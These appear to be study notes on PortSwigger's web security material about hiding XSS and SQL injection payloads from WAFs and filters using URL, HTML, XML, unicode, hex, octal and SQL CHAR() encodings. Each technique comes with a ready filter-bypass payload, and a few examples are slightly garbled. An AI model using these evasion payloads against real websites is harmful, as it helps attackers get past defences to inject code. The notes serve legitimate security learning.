<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Essential Skills</title>
  <link rel="stylesheet" href="/static/style.css">

</head>
<body>
<header id="title-block-header">
</header>
<h1 id="essential-skills">Essential Skills</h1>
<ul>
<li><p>Links:</p>
<ul>
<li><p>Obfuscating attacks using encodings:
https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings</p></li>
<li><p>Using Burp Scanner during manual testing:
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing</p></li>
</ul></li>
</ul>
<p><br><br></p>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#obfuscating-attacks-using-encodings">Obfuscating
attacks using encodings</a></p></li>
<li><p>Using Burp Scanner during manual testing -
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing</p></li>
</ul>
<p><br><br></p>
<h2 id="obfuscating-attacks-using-encodings">Obfuscating attacks using
encodings</h2>
<p><br></p>
<ul>
<li><p>CyberChef can be used to help obfuscate and encode characters as
mentioned in this section:</p>
<ul>
<li>https://gchq.github.io/CyberChef/</li>
</ul></li>
</ul>
<p><br><br></p>
<h3 id="context-specific-decoding">Context-specific decoding</h3>
<ul>
<li><p>Both clients and servers use a variety of different encodings to
pass data between systems. The exact sequences of decoding steps depends
on the context in which the data appears.</p>
<ul>
<li><p>Example: A query parameter is typically URL decoded
server-side.</p></li>
<li><p>Example: The text xontent of an HTML element may be HTML decoded
client-side.</p></li>
</ul></li>
<li><p>Understanding the context of the targeted input fields can help
to idenitfy how the data is being decoded. With this information it can
help us construct payloads that when decoded will represent the same
malicious data.</p></li>
</ul>
<p><br><br></p>
<h3 id="decoding-discrepancies">Decoding discrepancies</h3>
<ul>
<li><p>Injection attacks usually involve injecting payloads that have a
recognizable patterns, like &lt;script&gt; for XSS or SELECT for SQLi.
So websites will often implement defenses to block these requests
containing these inputs.</p></li>
<li><p>These kinds of input filters need to decode the input in order to
check if the data is safe or not.</p></li>
<li><p>If these filters do not use the same decoding procedures that the
back-end server or browser uses then this can enable an attacker to
sneak harmful payloads past the filter by applying different encodings
that will automatically be removed later.</p>
<ul>
<li>Example: Website URL decodes the data once to identify if the input
is safe. However, the back-end server performs double URL decoding.</li>
</ul></li>
</ul>
<p><br><br></p>
<h3 id="obfuscation-via-url-encoding">Obfuscation via URL encoding</h3>
<ul>
<li><p>Any URL-based input is automatically URL decoded server-side
before it is assigned to the relevant variables. This means that, as far
as most servers are concerned, sequences like %22, %3C, and %3E in a
query parameter are synonymous with “, &lt;, and &gt; characters
respectively.</p></li>
<li><p>WAFs sometimes can fail to properly URL decode the input when
checking it. We may be able to smuggle payload by encoding any
characters or words that are blacklisted.</p>
<ul>
<li><p>Example: The application is blocking the SELECT statement to
prevent SQL injections.</p></li>
<li><p>Payload: URL encode SELECT -&gt; %53%45%4C%45%43%54</p></li>
</ul></li>
</ul>
<p><br><br></p>
<h3 id="obfuscation-via-double-url-encoding">Obfuscation via double URL
encoding</h3>
<ul>
<li><p>Servers may perform 2 rounds of URL decoding, where as the WAF
performs only 1 round of URL decoding. In this scenario we can encode or
payload twice to bypass the filters and inject the data to the
application.</p>
<ul>
<li><p>Example: The application is blocking the &lt;&gt; tags to prevent
XSS and the WAF URL decodes the injected input only once.</p></li>
<li><p>Payloads to bypass filter:</p>
<ul>
<li><p>%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E</p></li>
<li><p>%25%33%63%25%36%39%25%36%64%25%36%37%25%32%30%25%37%33%25%37%32%25%36%33%25%33%64%25%37%38%25%32%30%25%36%66%25%36%65%25%36%35%25%37%32%25%37%32%25%36%66%25%37%32%25%33%64%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39%25%33%65</p></li>
</ul></li>
</ul></li>
</ul>
<p><br><br></p>
<h3 id="obfuscation-via-html-encoding">Obfuscation via HTML
encoding</h3>
<ul>
<li><p>In specific locations within the HTML, such as the content of an
element or value of an attribute, browsers will automatically decode
those values when they parese the document.</p></li>
<li><p>Alternatively, the reference may be provided using the
character’s decimal or hex code point, in this case, : and :
respectively.</p></li>
<li><p>We can take advantage of this behavior to obfuscate payloads for
client-side attacks like XSS, which hides them from server-side
checks.</p>
<ul>
<li><p>Example: The server-side application is checking for the alert()
payload and rejecting requests with that input.</p></li>
<li><p>Payload to bypass filters:</p></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>img src<span class="op">=</span>x onerror<span class="op">=</span><span class="st">&quot;&amp;#x61;lert(1)&quot;</span><span class="op">&gt;</span></span></code></pre></div>
<ul>
<li>When the browser renders the page, it will decode and execute the
injected payload.</li>
</ul>
<p><br><br></p>
<h4 id="leading-zeros">Leading zeros</h4>
<ul>
<li>If your payload still gets blocked after HTML encoding it, you may
find that you can evade the filter just by prefixing the code points
with a few zeros:</li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;javascript&amp;#00000000000058;alert(1)&quot;</span><span class="op">&gt;</span>Click me<span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-xml-encoding">Obfuscation via XML encoding</h3>
<ul>
<li><p>XML is closely related to HTML and also supports character
encoding using the same numeric escape sequences. This enables you to
include special characters in the text content of elements without
breaking the syntax, which can come in handy when testing for XSS via
XML-based input, for example.</p></li>
<li><p>This behavior can be useful to obfuscate payloads which will be
decoded server-side instead of client-side by a browser.</p>
<ul>
<li>Example:</li>
</ul></li>
</ul>
<div class="sourceCode" id="cb3"><pre
class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">stockCheck</span>&gt;</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">productId</span>&gt;</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        123</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">productId</span>&gt;</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">storeId</span>&gt;</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        999 <span class="dv">&amp;#x53;</span>ELECT * FROM information_schema.tables</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">storeId</span>&gt;</span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">stockCheck</span>&gt;</span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-unicode-escaping">Obfuscation via unicode
escaping</h3>
<ul>
<li><p>Unicode escape sequences consist of the prefix ollowed by the
four-digit hex code for the character. For example, 03a represents a
colon. ES6 also supports a new form of unicode escape using curly
braces: .</p></li>
<li><p>For example, let’s say you’re trying to exploit DOM XSS where
your input is passed to the eval() sink as a string. If your initial
attempts are blocked, try escaping one of the characters as
follows:</p></li>
</ul>
<div class="sourceCode" id="cb4"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="pp">eval</span>(<span class="st">&quot;</span><span class="sc">\u0061</span><span class="st">lert(1)&quot;</span>)</span></code></pre></div>
<ul>
<li><p>As this will remain encoded server-side, it may go undetected
until the browser decodes it again.</p></li>
<li><p>It’s also worth noting that the ES6-style unicode escapes also
allow optional leading zeros, so some WAFs may be easily fooled using
the same technique we used for HTML encodings. For example:</p></li>
</ul>
<div class="sourceCode" id="cb5"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;javascript</span><span class="sc">\u{0000000003a}</span><span class="st">alert(1)&quot;</span><span class="op">&gt;</span>Click me<span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-hex-escaping">Obfuscation via hex escaping</h3>
<div class="sourceCode" id="cb6"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">val</span>(<span class="st">&quot;</span><span class="sc">\x61</span><span class="st">lert&quot;</span>)</span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-octal-escaping">Obfuscation via octal
escaping</h3>
<div class="sourceCode" id="cb7"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="pp">eval</span>(<span class="st">&quot;</span><span class="sc">\141</span><span class="st">lert(1)&quot;</span>)</span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-multiple-encodings">Obfuscation via multiple
encodings</h3>
<ul>
<li>It is important to note that you can combine encodings to hide your
payloads behind multiple layers of obfuscation. Look at the javascript:
URL in the following example:</li>
</ul>
<div class="sourceCode" id="cb8"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;javascript:&amp;bsol;u0061lert(1)&quot;</span><span class="op">&gt;</span>Click me<span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
<ul>
<li>Browsers will first HTML decode \, resulting in a backslash. This
has the effect of turning the otherwise arbitrary u0061 characters into
the unicode escape 061:</li>
</ul>
<div class="sourceCode" id="cb9"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;javascript:</span><span class="sc">\u0061</span><span class="st">lert(1)&quot;</span><span class="op">&gt;</span>Click me<span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
<ul>
<li>This is then decoded further to form a functioning XSS payload:</li>
</ul>
<div class="sourceCode" id="cb10"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;javascript:alert(1)&quot;</span><span class="op">&gt;</span>Click me<span class="op">&lt;/</span>a<span class="op">&gt;</span></span></code></pre></div>
<p><br><br></p>
<h3 id="obfuscation-via-the-sql-char-function">Obfuscation via the SQL
CHAR() function</h3>
<ul>
<li>For example, even if SELECT is blacklisted, the following injection
initially appears harmless:</li>
</ul>
<pre><code>CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)</code></pre>
<ul>
<li>However, when this is processed as SQL by the application, it will
dynamically construct the SELECT keyword and execute the injected
query.</li>
</ul>
</body>
</html>
